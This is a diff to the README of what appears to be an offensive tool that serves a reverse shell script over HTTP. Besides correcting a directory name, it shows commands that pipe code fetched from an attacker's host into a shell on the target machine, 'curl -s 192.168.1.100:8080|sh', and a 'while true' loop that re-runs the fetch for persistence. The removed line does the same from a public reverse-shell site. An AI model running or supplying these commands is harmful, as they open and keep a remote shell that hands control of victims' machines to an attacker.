@@ -22,7 +22,7 @@ This project implements a simple HTTP server that serves a reverse shell script 
 1. Clone this repository:
    ```bash
    git clone https://github.com/laztname/curlsh.git
-   cd reverse-shell-server
+   cd curlsh
    ```
 
 2. Make the script executable:
@@ -56,7 +56,7 @@ curl -s 192.168.1.100:8080|sh
 ```
 or run this for persistence on the target machine
 ```bash
-while true; do curl https://reverse-shell.sh/yourip:1337 | sh; done
+while true; do curl -s 192.168.1.100:8080 | sh; done
 ```
 
 
